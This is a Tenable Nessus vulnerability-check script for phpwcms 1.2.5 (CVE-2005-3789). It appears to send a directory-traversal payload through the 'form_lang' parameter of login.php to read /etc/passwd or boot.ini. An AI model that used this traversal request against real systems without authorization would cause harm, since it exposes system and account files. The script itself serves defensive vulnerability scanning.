#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20216);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2005-3789");
  script_bugtraq_id(15436);
  script_xref(name:"OSVDB", value:"20862");
  script_xref(name:"OSVDB", value:"20863");

  script_name(english:"phpwcms 1.2.5 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in phpwcms");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpwcms, an open-source content management
system written in PHP. 

The version of phpwcms installed on the remote host does not sanitize
input to the 'form_lang' parameter of the 'login.php' script before
using it in PHP 'include()' functions.  An unauthenticated attacker
can exploit this issue to read local files and potentially to execute
arbitrary PHP code from local files.  A similar issue affects the
'imgdir' parameter of the 'img/random_image.php' script, although that
can only be used to read local files. 

In addition, the application fails to sanitize user-supplied input
before using it in dynamically-generated pages, which can be used to
conduct cross-site scripting and HTTP response splitting attacks. 
Some of these issues require that PHP's 'register_globals' setting be
enabled." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/416675" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpwcms", "/cms", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure login.php exists.
  r = http_send_recv3(method: "GET", item:string(dir, "/login.php"), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does and looks like it's from phpwcms...
  if (
    "phpwcms" >< res &&
    '<input name="form_loginname"' >< res
  ) {
    # Try to read a file.
    foreach file (make_list("/etc/passwd", "boot.ini")) {
      # nb: the app conveniently strips any slashes added by magic_quotes_gpc!
      postdata = string("form_lang=../../../../../../../../../../../../", file, "%00");
      r = http_send_recv3(method: "POST ", item: dir+"/login.php", version: 11, port: port,
      	add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
	data: postdata);
      if (isnull(r)) exit(0);
      res = r[2];

      # There's a problem if it looks like one of the files...
      if (
        egrep(pattern:"root:.*:0:[01]:", string:res) ||
        "[boot loader]">< res
      ) {
        if (report_verbosity > 0) {
          contents = res - strstr(res, "<!DOCTYPE HTML PUBLIC");
          if (!contents) contents = res;

          report = string(
            "\n",
            contents
          );
          security_warning(port:port, extra:report);
        }
        else security_warning(port);

	set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
        exit(0);
      }
    }
  }
}
